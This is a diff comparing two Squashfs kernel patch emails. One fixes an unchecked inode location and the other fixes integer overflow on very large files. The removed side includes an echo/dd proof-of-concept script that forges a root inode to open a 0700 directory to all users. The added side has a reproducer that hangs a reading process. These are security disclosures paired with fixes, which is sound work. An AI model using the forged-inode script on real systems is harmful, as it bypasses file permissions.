@@ -1,76 +1,76 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=188.121.53.111
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=92.204.81.223
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1794029376;
-	b=2t9TucT+4m5ImYeQahP7kq8SeaU0DKcFmW+cJr91CUP1g2wFe7c7xnJkU26iWYtYZV8O
-	 To3hAhJDVak9Kdw5FPSt4eOdwkaWTinUf6zN1uw369lcz5NbCv+aHm5VIzm3519cJfkUX
-	 PaxrWCkn8Cr8I9PWxyZXV4QT+zL1GrTUM9CNVoKejO/jAtPI0AluP8UcE8V8DXNsL25JV
-	 aNKNOpH/+Cet0GUybuGr3pzMc43uEYmWq2GW4iTgJsfbKFMSzKQ0bzLi5OVMudfvR2miU
-	 x0ZWXqbH9S5IbywKRXXMAv5K7ulcQyL+Aw9L/V6oY+k41rSdi6YK639W1CR+ngWLDoA==
+	t=1794029382;
+	b=mCWwcWvG8JJJHbd9UFkIH9lgxOYIhJW8kjU5xAffLJlr15CWJAZztLnHhg2MDNQ+kJ6P
+	 yPRGZRxR2j83XAwAY2F3AEVZtFPhxwwWQWKFSvYVekWW2F5KVuZvTVTXpZzwFrkDC01d3
+	 VweaHV5JjxOA5eBVFRKH7DrPP/srKKrQiGIdn2Qd5SxpKWiR6HYhs6ZMx3AExdWPdeumN
+	 aJ1jPQkdEsD0kQes0SbO0VZEzxOqaSGf5/hsbCEVBMT4k4X+g0YMgV9KLC0kY643uhUNo
+	 m4lIWdrCDp4F8V9hlS2MMglAWIrP1NDB2DTd4CdNmyKu1C9R0aIYjHtScXILN3sO50Q==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1794029376;
+	a=rsa-sha256; c=relaxed/relaxed; t=1794029382;
 	h=DMARC-Filter:Received:DKIM-Signature:DKIM-Signature:X-CMAE-Analysis:
 	 Feedback-ID:X-SECURESERVER-ACCT:From:To:Cc:Subject:Date:Message-ID:
 	 X-Mailer:In-Reply-To:References:MIME-Version:
 	 Content-Transfer-Encoding:X-CMAE-Envelope;
-	bh=tKHY5w0bvLa/aR9969VxnRVXjmiiemPUJVeETOmlrQ8=;
-	b=fDhj/Q1soalifgRFN65OMaXUCBNQJOZ2sEvxzV2lf9j0Xo9f58AmgbvezfzGT/ft+K/G
-	 dw9yxoJ82NMX/uv2aDqMaakVTlCUj6eCof8wdmEK9UKcKUsbgj4P3WRs3fGaDO/P3FsZ0
-	 w8Fj1UJh/l2ykxoMm49ZFEqxXDg6z2Fw1tjjQB7Z8TN4EngKcsUokagiLRHz2HDMAQNSF
-	 oAasG7SCeejVZ9Bo/z2VUVNKqHO3wdUgzwgAhooicL8xFKVMed9asAI+FIL2FeJYuG4PO
-	 CrHM8UENwXd6ApOUNYrXoUQocb6pTmVnoz4CmzijghcVt+M06r7UqrrWHaWc/g93PiA==
+	bh=4sjB9n88n6D0m3se+cNhWFRKdR7kvC5kPczfEWD8gyg=;
+	b=cvn8bprdZpY5FWpWVsI7BX7f6D2eGVOOwfH9ZbUv8mD1RrGU4p0l78M3Md8KbFxr/8lb
+	 VLlzvTI5szlKNOt76ghKDMwO7+2hKr2jUx+poLf9rqIRXLqUbr0pHdyWYWxuXF2tCbfYd
+	 cMcJHnIiLLAgIY6QgZJPDie00NmCC88Ok75zFd6rqD6JWMmbvOwD0hHJa4onIN7Uoa3v2
+	 TwW/CpLholbDaRiSQttBixghG7Awa4kGqg8Mbm+wuwwHqF6lA9aMujDaJ5gDtra8US7b0
+	 1lZ7Z2KnRb/TyoLHMChL+0xZJuyX/6c6fCSZXAzfm5Ut5BmhzTIQhDN/dKLVQxlXWxg==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
 	dmarc=pass header.from=squashfs.org.uk;
 	spf=pass smtp.mailfrom=squashfs.org.uk;
-	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=ifkJB54y;
-	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=S8EzUNpw;
-	arc=none smtp.remote-ip=188.121.53.111
-Received: from sxplsmtpa04-10.prod.sxb1.secureserver.net (sxplsmtpa04-10.prod.sxb1.secureserver.net [188.121.53.111])
+	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=N+0vBwmA;
+	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=AjyGFBh4;
+	arc=none smtp.remote-ip=92.204.81.223
+Received: from sxplsmtpa04-10.prod.sxb1.secureserver.net (sxplsmtpa04-10.prod.sxb1.secureserver.net [92.204.81.223])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 71A0A606A33A
-	for <linux-kernel@vger.kernel.org>; Sat,  7 Nov 2026 05:29:35 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 71A0A606A33A
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 98313606D804
+	for <linux-kernel@vger.kernel.org>; Sat,  7 Nov 2026 05:29:41 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 98313606D804
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=squashfs.org.uk
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=squashfs.org.uk
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=ifkJB54y;
-	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=S8EzUNpw
+	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=N+0vBwmA;
+	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=AjyGFBh4
 Received: from avalon.fritz.box ([82.69.79.175])
 	by :SMTPAUTH: with ESMTPA
-	id PYyzxFofBjLMrPYzRx4crq; Sat, 07 Nov 2026 05:29:21 +0000
+	id PYyzxFofBjLMrPYzWx4csN; Sat, 07 Nov 2026 05:29:27 +0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secureserver.net;
-	s=secureserver2; t=1794029362;
-	bh=tKHY5w0bvLa/aR9969VxnRVXjmiiemPUJVeETOmlrQ8=;
+	s=secureserver2; t=1794029368;
+	bh=4sjB9n88n6D0m3se+cNhWFRKdR7kvC5kPczfEWD8gyg=;
 	h=From:To:Cc:Subject:Date:In-Reply-To:References;
-	b=ifkJB54yqFSYcAf/PnKkZ/Hlbtbnsewj1z9dxMbxVeJRtUbzrWwwvChLYYddMeeFX
-	 pkHtk0eneuZ2Ctlbek0rv8osYJ4s0b9ivslOgOgIAGOV/M/dktZVj6jVPJ09f2HSH/
-	 uumXgiAYjBszvzXe1fzFK896Q98XHGeLObwrNMhm0hy8bmsh1CCZnrLzkxQ2YHQQmB
-	 gLveE5OstSi4WAASeY6sBXNmRLx6Mry/BQ1Cag0HoirYm5OOEziwezxSGG27zZ72A3
-	 zpjBSaR/Zzi/+bCqcPhxwBSobVa6E7WLYxs28SZA7eVKJ7PNMG8j0gMTILf6mxUAxn
-	 vMc8538ACNQIg==
+	b=N+0vBwmA3za0zq0ykYqO6tN9hAGx86UP/RWq+IvModbfhIX5B4XsrSuYCBQcNiFl4
+	 FE4G5BQGYClJLjOBLuBYYxvtuIT0WWcGUcwCyK7u+0+MoWThHquNKfLPbOtQmiRxi8
+	 oE9O29jmCcO1/3GPZzvmrC27XX0i7D2qn9oxSna9ZOS4yp9TqmXKBl4si4+K/38AGZ
+	 i0SCEbGaPMKFPHPy2nKeXZdXEjZi0lSQV8Yw1Z5dgK+oNTvnSKfWMQH20/W69Q/9Au
+	 fdpAfsntDdSIqt1TMqX8Rd/QvzUvS5CZlI8le4HKqKNR08yv7vagFEK/5Jm9b5vCTR
+	 15Gl2GlMyJDTA==
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=squashfs.org.uk;
-	s=secureserver1; t=1794029362;
-	bh=tKHY5w0bvLa/aR9969VxnRVXjmiiemPUJVeETOmlrQ8=;
+	s=secureserver1; t=1794029368;
+	bh=4sjB9n88n6D0m3se+cNhWFRKdR7kvC5kPczfEWD8gyg=;
 	h=From:To:Cc:Subject:Date:In-Reply-To:References;
-	b=S8EzUNpwXpYultOyhoZQpFrKxGOAx/+prla8YIpMlkY1WkDr21AzeEhU5B6+cqN1P
-	 JQ8OYvqoM6YUWlQcg8iStQ7qxn5FruEn/TTWPqVLcN2eQQ26zjHSCqoqmrmxHJUpL0
-	 8BEytftE5DarugOweAdWkbLpexTPHZlnpL/iIUBFgGpPWjBXF6SSj5+VTqNNLKkjge
-	 7rha91jPF3KPD7DPpaytlfrS/3/vodh1mU835l1MXO88w8O1u7SUhZn2KjoIis2xTo
-	 5CuMLMK8UT+M2Gc6qToe9aSK8p1i9HlgKOli/H0GREJn0zQdy4NUBKXjj4yLVFsgIO
-	 yFC34Owi7PzAg==
-X-CMAE-Analysis: v=2.4 cv=fZ84WEQF c=1 sm=1 tr=0 ts=6aeeb732
+	b=AjyGFBh4F65SiOz7UWHx7K5NY0juytqRHPkWj25KP6S5DMURTOCmyBxKno9q3N0Th
+	 xito2z0Zq4k1BsutDnhPDWETsVNtVgFc/i2kxW1gLYQeDFj3Zrw4JqXAsvCSy7RzAa
+	 fctLO0Qy93aSuMnfzhQdrr7WOiHaffKbuoM3FjNJECYJaaulqtdijhxdyZcVVXlIic
+	 fS0+98GXLwjpWYYpNM4N7IEchsalUvwSpwbv8r2+o/3R3cW1MIhC7Udgp75+eDHObA
+	 p4fPsshRHP56AaJ4mDrD01PdzrYsDYOAYL8FZyYiczH2ae9CCwsDsa4YTj7CebDV6S
+	 zn7XvTdXiO5GQ==
+X-CMAE-Analysis: v=2.4 cv=fZ84WEQF c=1 sm=1 tr=0 ts=6aeeb737
  a=84ok6UeoqCVsigPHarzEiQ==:117 a=84ok6UeoqCVsigPHarzEiQ==:17 a=FXvPX3liAAAA:8
- a=WbH0joDL9KXNTEjrqjoA:9 a=UObqyxdv-6Yh2QiB9mM_:22
-Feedback-ID: b1f91c23c774c9192d297a27ff196e48:squashfs.org.uk:ssnet
+ a=IeOlCYqPYvspwizo2FwA:9 a=UObqyxdv-6Yh2QiB9mM_:22
+Feedback-ID: 38bf870c74a197a5a12c81273644a355:squashfs.org.uk:ssnet
 X-SECURESERVER-ACCT: phillip@squashfs.org.uk
 From: Phillip Lougher <phillip@squashfs.org.uk>
 To: akpm@linux-foundation.org,
 	linux-kernel@vger.kernel.org
 Cc: Phillip Lougher <phillip@squashfs.org.uk>
-Subject: [PATCH 09/18] Squashfs: sanity check inode metadata block location
-Date: Sat,  7 Nov 2026 05:28:34 +0000
-Message-ID: <20261107052843.725239-10-phillip@squashfs.org.uk>
+Subject: [PATCH 12/18] Squashfs: very large files can exceed an int block count
+Date: Sat,  7 Nov 2026 05:28:37 +0000
+Message-ID: <20261107052843.725239-13-phillip@squashfs.org.uk>
 X-Mailer: git-send-email 2.47.3
 In-Reply-To: <20261107052843.725239-1-phillip@squashfs.org.uk>
 References: <20261107052843.725239-1-phillip@squashfs.org.uk>
@@ -84,61 +84,35 @@ List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
-X-CMAE-Envelope: MS4xfCQ87mJXdt25QGmEr4rL7PZ4Mq6NPhzTHRtEsIBjG5DZAf0/pRFkLDf74uVnv6nb+FUVFc1OoKComadNKuKwc1jUlJVjWRW+nsyBS0M2Pxzn1De2pAMf
- 6OnrclXUKGM9bneR2plDvj9NknUdZnZ5zpnMvnq4wpvpa/3AuNMNcBm5MSgI7VjWFWPXH6YMl38hiiQvANlcTpKD8e6g6PmmSzT+zmD3f8pvi1XnhMQ4K8iI
- D6lZNDZPF/4djLwPC0L+8gpjsHr6ZkUfnTjpqF8JxvAt3lVGIHrVZd9tvCsDNMed
+X-CMAE-Envelope: MS4xfHCOImmIEnAlJy4HHO6GkxmwiB8/CAQN0r09oll/m2bXEKQxY+CgvYBS9S89Bg7X8FcayqReX759do2DejnEEcAbZldP6vozIpAS0jSasYOIoH6zvMX/
+ 2XZz1HApRIWr9QjLziT7J/ZxxxicKIX/mNm7qTJe2JTXNsPUXjeIJ/xONVgb9/e4Jl13Qiwv1GpA/Bq0ejWMFIVP3HOn9qMAXAQAU/ZXHKfGOI6oiSt1Ea+3
+ Z4CTQK4IIqPPt54UsBbaNtr7i3iVz+9c6tD2Mm9eawRk6zG8EZCHShIMjfKfGptp
 
-An inode reference in Squashfs is represented as a tuple, the location
-of the compressed metadata block the inode is in, and the offset into
-the uncompressed block.  The location is not absolute and it is instead
-encoded as an offset from the start of the inode table.
+Squashfs in many places uses a signed int to store the block number and
+block count of a file.  If the block size is using the Linux page size
+(normally 4 KiB), it means any file larger than 8 TiB (2^43) will
+overflow a signed int.
 
-An attacker could manipulate the inode reference to make it point to a
-replacement malicious inode stored elsewhere, outside the inode table.
-This is because the code does not check that the location is valid and
-is within the inode table.
+If the block number and block count is in terms of the Squashfs
+filesystem block size (which can be between 4 kiB and 1 MiB), it
+depends on the block size as to when a signed int will overflow, but a
+file larger than 256 TiB (2^48) using 128 KiB blocks will overflow a
+signed int.
 
-In practice this exploit is hard to achieve because metadata in Squashfs
-is compressed by default, and so the compressed metadata cannot be
-directly altered.  In addition due to sanity checking at mount time
-there are no gaps in the filesystem to hide a malicious inode.
-
-Also anyone with access to Mksquahfs/Unsquashfs can copy and recreate
-the filesystem incorporating whatever changes they want.
-
-However there are a number of exploit scenarios here.  Many embedded
-systems or secure systems have deliberately restricted installations
-with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
-due to this bug can be achieved with only echo and dd.
-
-An example exploit is where a Squashfs filesystem root directory has
-permissions 0700 (u=rxw), where only the superuser can enter the
-directory and access the content within. But using this bug an attacker
-could place a malicious root inode in the inode lookup table (used by
-NFS) which has the permissions changed to 0777 (a=rwx), and then update
-the root_inode field in the superblock to point to that.  On
-reboot/remount this will make the directory accesisible to unprivileged
-users.
-
-The following shell script acts as a reproducer and proof of concept.
-
-This commit blocks such attempts by adding a new helper
-squashfs_inode_start() which adds additional sanity checking, first
-ensuring no arithmetic operations overflow, and second checking that
-the inode is within the inode table.
+This commit widens all appropriate variables to long long (s64) to
+avoid overflow.
 
 Reproducer
 ==========
 
-The following Bash script uses echo and dd to achieve the previously
-discussed exploit.  If the exploit is successful the root directory
-permisions will be changed to 0777 (a=rwx), but otherwise the filesystem
-is unchanged.
+The following reproducer creates a Squashfs filesystem with a 8 TiB +
+4096 byte sparse file.  The filestem is mounted, and the last 4096
+bytes are read from the file.  If the reproducer is successful the
+process will hang.  This is because signed int overflow occurs in
+squashfs_copy_cache() with the result that folio_end_read() is
+not called.
 
-======================================================================
-#!/bin/bash
-
-ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"
+====================================================================
 
 finish() {
 	popd 2>&1 > /dev/null
@@ -150,148 +124,147 @@ DIR=$(mktemp -d)
 
 pushd $DIR 2>&1 > /dev/null
 
-# Create a Squashfs pseudo file which is fed to Mksquashfs
-echo Create a Squashfs pseudo file which is fed to Mksquashfs
+echo "Create an 8 Tib (2^43) + 4096 byte sparse file"
 
-dd if=/dev/zero of=zero bs=1024 count=1 status=none
-for i in $(seq 1 100); do
-	echo "$i l zero" >> pseudo
-done
-
-# Create a Squashfs filesystem with the root directory permissions u=rwx (0700)
-echo "Create a Squashfs filesystem with the root directory permissions u=rwx (0700)"
-
-if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0700 0 0" $ARGS; then
-	echo Failed to create Squashfs filesystem
+if ! truncate --size 8796093026304 bigfile; then
+	echo Create of sparse file failed.
 	finish
 fi
 
-# The root_inode field in the superblock points to the compressed metadata
-# block and offset within it, where the root inode is stored.
-#
-# Create a malicious root inode and hide it in the inode lookup table.
-# Because of mount time checking, there are no gaps between metadata tables
-# where it can be hidden, and it can't be hidden after the file system end,
-# because this is checked.
+echo Generate the Squashfs filesystem containing the sparse file
+echo This will be VERY slow on Squashfs-tools older than 4.7.3
 
-# Write malicious inode, this is the same as the original root inode, except
-# it is uncompressed, and the permissions are set to 0777.
-/usr/bin/echo -en "\x20\x80\x01\x00\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\
-\x65\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xec\x03\x00\x00\x00\x00\x00\
-\x00" > file
+mksquashfs bigfile bigfile.sqsh -b 1M -quiet
 
-# Place new root inode inside the inode lookup table
-echo Place new root inode inside the inode lookup table
-
-dd bs=1 seek=960 if=file of=img.sqsh count=34 conv=notrunc status=none
-
-# Update the root_inode field in the superblock to point to our new inode
-# The start block is an offset from the inode_table_start, and not an
-# absolute value.  The start of the inode table is 113, the new inode
-# is placed at position 964, and so the offset is 851. Because we've only
-# stored one inode in the metadata block, the offset into that block is 0.
-#
-echo Update the root_inode field in the superblock to point to our new inode
-
-/usr/bin/echo -en "\x00\x00\x4f\x03" > file
-
-dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none
-
-# Mount the filesystem to /mnt
 echo Mount the filesystem to /mnt
 
-if ! mount -t squashfs img.sqsh /mnt; then
+if ! mount -t squashfs bigfile.sqsh /mnt; then
 	echo Mount of Squashfs filesystem failed
 	finish
 fi
 
-# Stat /mnt, if the exploit is successful, permissions should be 0777
-echo Stat /mnt, if the exploit is successful, permissions should be 0777
+echo Read the last 4096 bytes from the sparse file.
+echo If the exploit succeeds the process will hang
 
-stat /mnt
+dd if=/mnt/bigfile bs=1 skip=8796093022208
 
-popd 2>&1> /dev/null
-
+popd 2>&1 > /dev/null
 rm -rf $DIR
-======================================================================
+exit 0
+====================================================================
 
-Fixes: 6545b246a2c8 (" Squashfs: inode operations")
+Fixes: 1701aecb6849c ("Squashfs: regular file operations")
 Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
 ---
- fs/squashfs/inode.c            | 13 ++++++-------
- fs/squashfs/squashfs_helpers.h | 18 ++++++++++++++++++
- 2 files changed, 24 insertions(+), 7 deletions(-)
+ fs/squashfs/file.c | 27 ++++++++++++++-------------
+ 1 file changed, 14 insertions(+), 13 deletions(-)
 
-diff --git a/fs/squashfs/inode.c b/fs/squashfs/inode.c
-index 73232582aca2..03e88c5b545a 100644
---- a/fs/squashfs/inode.c
-+++ b/fs/squashfs/inode.c
-@@ -109,8 +109,8 @@ int squashfs_read_inode(struct inode *inode, long long ino)
+diff --git a/fs/squashfs/file.c b/fs/squashfs/file.c
+index ad6382cd22d3..05ae61dd6be2 100644
+--- a/fs/squashfs/file.c
++++ b/fs/squashfs/file.c
+@@ -35,6 +35,7 @@
+ #include <linux/string.h>
+ #include <linux/pagemap.h>
+ #include <linux/mutex.h>
++#include <linux/math64.h>
+ 
+ #include "squashfs_fs.h"
+ #include "squashfs_fs_sb.h"
+@@ -216,7 +217,7 @@ static long long read_indexes(struct super_block *sb, int n,
+  */
+ static inline int calculate_skip(u64 blocks)
  {
- 	struct super_block *sb = inode->i_sb;
- 	struct squashfs_sb_info *msblk = sb->s_fs_info;
--	u64 block = squashfs_inode_blk(ino) + msblk->inode_table;
--	int offset = squashfs_inode_offset(ino);
-+	s64 block = squashfs_inode_start(msblk, ino), sblock = block;
-+	int offset = squashfs_inode_offset(ino), soffset = offset;
- 	int err, type;
- 	union squashfs_inode squashfs_ino;
- 	struct squashfs_base_inode *sqshb_ino = &squashfs_ino.base;
-@@ -118,11 +118,13 @@ int squashfs_read_inode(struct inode *inode, long long ino)
- 
- 	TRACE("Entered squashfs_read_inode\n");
- 
-+	if (block < 0)
-+		goto failed_read;
+-	u64 skip = blocks / ((SQUASHFS_META_ENTRIES + 1)
++	u64 skip = div_u64(blocks, (SQUASHFS_META_ENTRIES + 1)
+ 		 * SQUASHFS_META_INDEXES);
+ 	return min((u64) SQUASHFS_CACHED_BLKS - 1, skip + 1);
+ }
+@@ -227,7 +228,7 @@ static inline int calculate_skip(u64 blocks)
+  * on-disk locations of the datablock and block list metadata block
+  * <index_block, index_offset> for index (scaled to nearest cache index).
+  */
+-static int fill_meta_index(struct inode *inode, int index,
++static s64 fill_meta_index(struct inode *inode, s64 index,
+ 		u64 *index_block, int *index_offset, u64 *data_block)
+ {
+ 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
+@@ -243,7 +244,7 @@ static int fill_meta_index(struct inode *inode, int index,
  	/*
- 	 * Read inode base common to all inode types.
+ 	 * Scale index to cache index (cache slot entry)
  	 */
--	err = squashfs_read_metadata(sb, sqshb_ino, &block,
--				&offset, sizeof(*sqshb_ino));
-+	err = squashfs_read_metadata(sb, sqshb_ino, &sblock,
-+				&soffset, sizeof(*sqshb_ino));
- 	if (err < 0)
- 		goto failed_read;
+-	index /= SQUASHFS_META_INDEXES * skip;
++	index = div_u64(index, SQUASHFS_META_INDEXES * skip);
  
-@@ -130,9 +132,6 @@ int squashfs_read_inode(struct inode *inode, long long ino)
- 	if (err)
- 		goto failed_read;
+ 	while (offset < index) {
+ 		meta = locate_meta_index(inode, offset + 1, index);
+@@ -327,14 +328,14 @@ static int fill_meta_index(struct inode *inode, int index,
+  * Get the on-disk location and compressed size of the datablock
+  * specified by index.  Fill_meta_index() does most of the work.
+  */
+-static int read_blocklist_ptrs(struct inode *inode, int index, u64 *start,
++static int read_blocklist_ptrs(struct inode *inode, s64 index, u64 *start,
+ 	int *offset, u64 *block)
+ {
+ 	long long blks;
+ 	__le32 size;
+-	int res = fill_meta_index(inode, index, start, offset, block);
++	s64 res = fill_meta_index(inode, index, start, offset, block);
  
--	block = squashfs_inode_blk(ino) + msblk->inode_table;
--	offset = squashfs_inode_offset(ino);
--
- 	type = le16_to_cpu(sqshb_ino->inode_type);
- 	switch (type) {
- 	case SQUASHFS_REG_TYPE: {
-diff --git a/fs/squashfs/squashfs_helpers.h b/fs/squashfs/squashfs_helpers.h
-index 524d4a77686d..662ebf464d3c 100644
---- a/fs/squashfs/squashfs_helpers.h
-+++ b/fs/squashfs/squashfs_helpers.h
-@@ -47,6 +47,24 @@ static inline u16 squashfs_inode_offset(s64 inode)
- 	return inode & 0xffff;
+-	TRACE("read_blocklist: res %d, index %d, start 0x%llx, offset 0x%x, block 0x%llx\n",
++	TRACE("read_blocklist: res %lld, index %lld, start 0x%llx, offset 0x%x, block 0x%llx\n",
+ 				res, index, *start, *offset, block ? *block : 0);
+ 
+ 	if (res < 0)
+@@ -364,7 +365,7 @@ static int read_blocklist_ptrs(struct inode *inode, int index, u64 *start,
+ 	return squashfs_block_size(size);
  }
  
-+static inline s64 squashfs_inode_start(struct squashfs_sb_info *msblk, s64 inode)
-+{
-+	s64 start;
-+
-+	if (inode < 0)
-+		return -EINVAL;
-+
-+	if (S64_MAX - msblk->inode_table < squashfs_inode_blk(inode))
-+		return -EINVAL;
-+
-+	start = msblk->inode_table + squashfs_inode_blk(inode);
-+
-+	if (start >= msblk->directory_table)
-+		return -EINVAL;
-+
-+	return start;
-+}
-+
- static inline s64 squashfs_mkinode(u32 start, u16 offset)
+-static inline int read_blocklist(struct inode *inode, int index, u64 *block)
++static inline int read_blocklist(struct inode *inode, s64 index, u64 *block)
  {
- 	return ((s64)start << 16) | offset;
+ 	u64 start;
+ 	int offset;
+@@ -397,8 +398,8 @@ void squashfs_copy_cache(struct folio *folio,
+ 	struct address_space *mapping = folio->mapping;
+ 	struct inode *inode = mapping->host;
+ 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
+-	int i, mask = (1 << (msblk->block_log - PAGE_SHIFT)) - 1;
+-	int start_index = folio->index & ~mask, end_index = start_index | mask;
++	s64 i, mask = (1 << (msblk->block_log - PAGE_SHIFT)) - 1;
++	s64 start_index = folio->index & ~mask, end_index = start_index | mask;
+ 
+ 	/*
+ 	 * Loop copying datablock into pages.  As the datablock likely covers
+@@ -412,7 +413,7 @@ void squashfs_copy_cache(struct folio *folio,
+ 		size_t avail = buffer ? min(bytes, PAGE_SIZE) : 0;
+ 		bool updated = false;
+ 
+-		TRACE("bytes %zu, i %d, available_bytes %zu\n", bytes, i, avail);
++		TRACE("bytes %zu, i %lld, available_bytes %zu\n", bytes, i, avail);
+ 
+ 		push_folio = (i == folio->index) ? folio :
+ 			__filemap_get_folio(mapping, i,
+@@ -464,8 +465,8 @@ static int squashfs_read_folio(struct file *file, struct folio *folio)
+ {
+ 	struct inode *inode = folio->mapping->host;
+ 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
+-	int index = folio->index >> (msblk->block_log - PAGE_SHIFT);
+-	int file_end = i_size_read(inode) >> msblk->block_log;
++	s64 index = folio->index >> (msblk->block_log - PAGE_SHIFT);
++	s64 file_end = i_size_read(inode) >> msblk->block_log;
+ 	int expected = index == file_end ?
+ 			(i_size_read(inode) & (msblk->block_size - 1)) :
+ 			 msblk->block_size;
+@@ -584,7 +585,7 @@ static void squashfs_readahead(struct readahead_control *ractl)
+ 	unsigned int nr_pages = 0;
+ 	struct page **pages;
+ 	int i;
+-	loff_t file_end = i_size_read(inode) >> msblk->block_log;
++	s64 file_end = i_size_read(inode) >> msblk->block_log;
+ 	unsigned int max_pages = 1UL << shift;
+ 
+ 	readahead_expand(ractl, start, (len | mask) + 1);
 -- 
 2.47.3
 
